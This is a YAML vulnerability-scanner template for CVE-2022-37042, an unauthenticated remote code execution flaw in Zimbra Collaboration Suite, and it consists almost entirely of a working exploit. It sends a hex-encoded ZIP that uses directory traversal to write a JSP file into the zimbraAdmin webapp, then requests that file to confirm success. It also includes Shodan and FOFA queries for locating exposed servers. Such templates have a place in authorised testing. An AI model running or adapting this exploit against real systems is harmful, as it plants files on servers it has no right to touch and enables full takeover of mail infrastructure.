id: CVE-2022-37042

info:
  name: Zimbra Collaboration Suite - Unauthenticated RCE
  author: momika233
  severity: critical
  description: |
    Zimbra Collaboration Suite (ZCS) 8.8.15 and 9.0 has mboximport functionality that receives a ZIP archive and extracts files from it. By bypassing authentication (i.e., not having an authtoken), an attacker can upload arbitrary files to the system, leading to directory traversal and remote code execution. This issue exists because of an incomplete fix for CVE-2022-27925.
  reference:
    - https://github.com/momika233
  metadata:
    shodan-query: http.favicon.hash:"1624375939"
    fofa-query: app="zimbra-邮件系统"
  tags: cve,cve2022,zimbra,rce,unauth

requests:
  - raw:
      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        content-type: application/x-www-form-urlencoded
        {{hex_decode("504b030414000800080000000000000000000000000000000000340000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f63616f6e696d612e6a7370d498416ee3300c45cf328bee134b961ca0989378d326cd0d7aff41f509e8c9b45d2569d1ce46081489fa243fbf283f3ffd99df0f87e1f0318ee163ccb18cc3c7984e657c2b63ae2bf35466cafa7029f35a9fcacc11ff96df612c63b11606cc4c1823d66b3c601cea29e1b522d129e95cc6b22b873a9a5f13d68f15bf3cd58cf918977be3aefda8f96bfd37c1a662980bdaacb8e9ac013615618f76fa9ad32d5f2fe5f7097842c5930f6ed7b4dca598e7cb7c932ffbf8cddf633d51d6b270c297b19c3e5ee665de8779e9d750771993e197b26c31d98f00f8600c29dc6e2aa2cc7fe2e3e4d09e2b06719b33cdca3758264b4b255a7cc4169723f3f1c67cf5c73f83a537ecd2596720b962a4a7e233f2956407b9369bd0ab8c7fd34bb593137e0bb92219dc5ed8142aadb42c638d22ef6b8daaf80318c0105641046f8d9f715ec4d9b8577629b3d2db58d644e534d479b2ce58f4561126fcd659c696129950fc329d2f510aa80ed657c6bdf3b5f1b438a0f6e9c51896f35e5be22b664e75d78acda9e26c62e533b5514dd41345de74a323478d3e742b648313d18b5e09c5a273456868712e15c99876ac186c0637b5dd80c246158562dbde53c5d6e01f2b865b6f07ab1465f05c47ef8bc683c697a7bfcf4fb0ee55a95b2b13ea93b56acab25521bbf61b15e0dd461642478cc7c73a9f91036fcd72cf286bef8819a8cf660d40d7363b1b2a94505d9778786bda89257ab1e74e75f5a3ec84dddba551406a376385fb5827ae74def49dac78d84ee07dfc78a61ec633b80e26795e15cb23f33bce0b8fec9da03a17ce09d69071ea8bc62dcbc36bb5ff78e4ada6fcbfa89dadaa97d66fe23cefee55ee7a38cfdbe24b6d5a667735ade92977e360b580ba1312aad30aa3d2bcc83ed7b36b5fb951b6f80f844df665419a89f5860d0ad3682cb9eade754dd705e66fdd55febdd7ef69b3fea73cdded05f94e26dface3dcefb1024e3fceef6b6f36ab85bb2c74bdcc5dc559df799c3faf02d6295e7d091c6832e8bb9f0eb5ff760e0cf577ba2ccf62ac323b5a2ac06e7c149978add8ecd696d7f4177a12782ba907dd670bf8d65f5fbf47491a9ebb5abbf3dd48edbdb5531a2a7e7a1ac11932472b9565c6e7ce3bda77bcc3bafd4ffaf0ffcb6b9fb504b45e31b4173a637ad511b7c74f21cf5947fbaf007ef3ddc260eb8b85aeafe12e6e8dc606a0252ad6cb961a7c4366cdc73c2f3cf27ad274623d3975d1bb8fcf2b5f37f0cecfd04043bb710ffe8a6f0d8bef02ff020000ffff504b0708cc4c1bf9910300006b190000504b030414000800080000000000000000000000000000000000340000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f63616f6e696d612e6a7370d498416ee3300c45cf328bee134b961ca0989378d326cd0d7aff41f509e8c9b45d2569d1ce46081489fa243fbf283f3ffd99df0f87e1f0318ee163ccb18cc3c7984e657c2b63ae2bf35466cafa7029f35a9fcacc11ff96df612c63b11606cc4c1823d66b3c601cea29e1b522d129e95cc6b22b873a9a5f13d68f15bf3cd58cf918977be3aefda8f96bfd37c1a662980bdaacb8e9ac013615618f76fa9ad32d5f2fe5f7097842c5930f6ed7b4dca598e7cb7c932ffbf8cddf633d51d6b270c297b19c3e5ee665de8779e9d750771993e197b26c31d98f00f8600c29dc6e2aa2cc7fe2e3e4d09e2b06719b33cdca3758264b4b255a7cc4169723f3f1c67cf5c73f83a537ecd2596720b962a4a7e233f2956407b9369bd0ab8c7fd34bb593137e0bb92219dc5ed8142aadb42c638d22ef6b8daaf80318c0105641046f8d9f715ec4d9b8577629b3d2db58d644e534d479b2ce58f4561126fcd659c696129950fc329d2f510aa80ed657c6bdf3b5f1b438a0f6e9c51896f35e5be22b664e75d78acda9e26c62e533b5514dd41345de74a323478d3e742b648313d18b5e09c5a273456868712e15c99876ac186c0637b5dd80c246158562dbde53c5d6e01f2b865b6f07ab1465f05c47ef8bc683c697a7bfcf4fb0ee55a95b2b13ea93b56acab25521bbf61b15e0dd461642478cc7c73a9f91036fcd72cf286bef8819a8cf660d40d7363b1b2a94505d9778786bda89257ab1e74e75f5a3ec84dddba551406a376385fb5827ae74def49dac78d84ee07dfc78a61ec633b80e26795e15cb23f33bce0b8fec9da03a17ce09d69071ea8bc62dcbc36bb5ff78e4ada6fcbfa89dadaa97d66fe23cefee55ee7a38cfdbe24b6d5a667735ade92977e360b580ba1312aad30aa3d2bcc83ed7b36b5fb951b6f80f844df665419a89f5860d0ad3682cb9eade754dd705e66fdd55febdd7ef69b3fea73cdded05f94e26dface3dcefb1024e3fceef6b6f36ab85bb2c74bdcc5dc559df799c3faf02d6295e7d091c6832e8bb9f0eb5ff760e0cf577ba2ccf62ac323b5a2ac06e7c149978add8ecd696d7f4177a12782ba907dd670bf8d65f5fbf47491a9ebb5abbf3dd48edbdb5531a2a7e7a1ac11932472b9565c6e7ce3bda77bcc3bafd4ffaf0ffcb6b9fb504b45e31b4173a637ad511b7c74f21cf5947fbaf007ef3ddc260eb8b85aeafe12e6e8dc606a0252ad6cb961a7c4366cdc73c2f3cf27ad274623d3975d1bb8fcf2b5f37f0cecfd04043bb710ffe8a6f0d8bef02ff020000ffff504b0708cc4c1bf9910300006b190000504b0102140014000800080000000000cc4c1bf9910300006b1900003400000000000000000000000000000000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f63616f6e696d612e6a7370504b0102140014000800080000000000cc4c1bf9910300006b1900003400000000000000000000000000f30300002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f63616f6e696d612e6a7370504b05060000000002000200c4000000e60700000000")}}
      - |
        GET /zimbraAdmin/caonima.jsp HTTP/1.1
        Host: {{Hostname}}
    payloads:
      path:
        - /service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1
        - /service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd

    stop-at-first-match: true
    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 401'
          - 'status_code_2 == 200'
          #- "contains(body_2,'NcbWd0XGajaWS4DmOvZaCkxL1aPEXOZu')"

# Enhanced by mp on 2022/05/16